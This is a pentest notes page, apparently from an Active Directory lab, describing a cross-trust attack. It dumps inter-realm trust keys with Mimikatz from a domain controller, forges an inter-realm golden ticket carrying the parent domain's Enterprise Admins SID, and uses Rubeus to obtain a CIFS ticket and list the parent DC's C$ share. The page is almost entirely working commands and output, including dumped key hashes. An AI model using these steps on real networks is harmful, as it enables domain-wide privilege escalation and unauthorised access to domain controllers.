---
description: Cross trust attack using trust key. Using inter-realm TGT
---

# Trust Key

## Dump trust keys 

Run **mimikatz** command ****on DA

```text
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
```

Output, lok for **In** key

```text
mimikatz(powershell) # lsadump::trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 9/27/2020 9:02:26 PM - CLEAR   - be 0a fc d1 08 25 09 04 ac ee 2c e2 dd 50 db d1 60 d0 7d c4 f7 03 62 e7 92 a0 0c 08 7c fb 99 30 ad f1 6d 7f b1 90 50 67 8e 38 d4 93 be 67 f6 19 07 fb 36 7b a7 05 2a c8 dd 42 7b 73 b3 b2 a0 17 97 bc ca 9a 2c e4 13 34 ff 9b f0 84 cd 30 c3 02 2b 92 87 17 2a f7 75 a6 2f 65 e1 6b 8d ec 76 60 d7 05 6c 80 9b e5 1a cc 91 19 68 b2 aa 4a 0f 56 59 5b 65 7b 44 5c 1b 6f 5c 63 a8 e5 32 9a ee 39 e2 a9 67 f3 a9 6b d1 39 c2 78 37 fe 08 5b 77 ae b7 e0 03 2b 63 a5 17 b7 a0 eb 18 51 3d f9 ad 26 d6 d6 d3 f2 21 71 0a b7 4b 33 fb c0 8f 41 78 62 5d ad be ed a1 ab 02 96 6d 0f 78 1c de 52 89 8d 39 9f 85 03 f1 e1 05 45 66 03 35 50 46 ff cb 4a d5 cf 9d 91 c4 46 79 c4 cc 53 94 21 9c 60 7b 49 00 2e e9 d1 0d 49 99 38 ab dd 69 ab 2f 20 e8 1f
        * aes256_hmac       9c679ac8d579bbc9cbbff6fa20bf91c4cbf6dad267b1c6292955b7a0ca445539
        * aes128_hmac       7d73b598e4388b30a95569ed50bec6b9
        * rc4_hmac_nt       0c9fcdc297aeef7be7d43e3f2e506203

 [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/27/2020 9:00:45 PM - CLEAR   - a1 f9 2a ef e2 cd ec 2d 46 bc 31 e4 eb 35 cf db da 5e 5e b7 41 be 77 ac f9 08 d0 bf 89 d9 08 1d 32 0b 70 cc 89 3b bd 11 82 bc a4 e4 dd 99 df 73 5d 8f f6 14 be 9e c4 90 ed f5 49 b6 28 e0 87 b6 c8 ee 2e 62 6e c3 05 80 8e 7a 09 3e da 5c 20 15 b2 ea b8 2b 68 1b 9b a7 a7 db 12 6b 36 c2 60 dd 63 24 0e a7 db 4d 35 b4 66 5d a0 97 53 26 39 b1 b6 fd 5e 6c 20 01 1d 26 06 ef 4d d6 78 da d4 c6 ab 6b e9 7b 3d 13 6e 11 b8 04 b9 15 6b e4 2e 27 7d d8 25 0f 10 3a af a8 af f8 89 4e 49 c3 de 19 cf 5e 94 62 e7 67 0a 05 90 09 14 f2 39 81 50 9c 5e f2 c0 05 28 01 c9 01 c6 ad 89 70 a0 81 9a f2 51 1b 39 8a 88 51 9f f2 4b d6 be ea fd a7 cc 6b fa 7d f8 cf 1a eb ed 7b 42 17 d2 68 43 90 77 24 ca 43 0a 5d f6 8a e1 fe 60 33 bb 51 92 58 07 4f
        * aes256_hmac       8e4082a248ca79667cf2bc36821b6143bff1c8e538c04204e2c4ef4278070f78
        * aes128_hmac       e3430cba6b78ca6f4e89951ea0972ddf
        * rc4_hmac_nt       7ed2312a08ab4158aa0c4adeb89d8765

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
```

## Create the inter-realm TGT

mimikatz on local machine

```text
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:0c9fcdc297aeef7be7d43e3f2e506203 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\tickets\trust_tkt.krbi"'
```

|  |  |
| :--- | :--- |
| **/domain** | FQDN of the current domain |
| **/user** | user to impersonate |
| **/sid** | SID of the current domain |
| **/sids** | sids of the enterprise admins group of the parent domain |
| **/rc4** | rc4 of the trust key |
| **/service** | target service in the parent domain |
| **/target** | FQDN of the parent domain |
| **/ticket** | path where ticket will be saved |

## Craft TGS with inter-realm TGT

Load saved ticket in Rubeus and craft TGS

```text
.\Rubeus.exe asktgs /ticket:C:\AD\tickets\trust_tkt.krbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

|  |  |
| :--- | :--- |
| **/ticket** | path to ticket |
| **/service** | service to abuse |
| **/dc** | domain controller we want to compromise |
| **/ptt** |  |

### Verify tickets - klist

```text
PS C:\AD\Tools> klist

Current LogonId is 0:0x2032d90
Cached Tickets: (1)

#0>     Client: Administrator @ dollarcorp.moneycorp.local
        Server: cifs/mcorp-dc.moneycorp.local @ MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/28/2020 11:53:32 (local)
        End Time:   9/28/2020 21:53:32 (local)
        Renew Time: 10/5/2020 11:53:32 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

### Request service - CIFS

```text
PS C:\AD\Tools> ls \\mcorp-dc.moneycorp.local\c$

    Directory: \\mcorp-dc.moneycorp.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   4:33 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---        2/16/2019   9:14 PM                Users
d-----        8/20/2020   2:57 AM                Windows
```

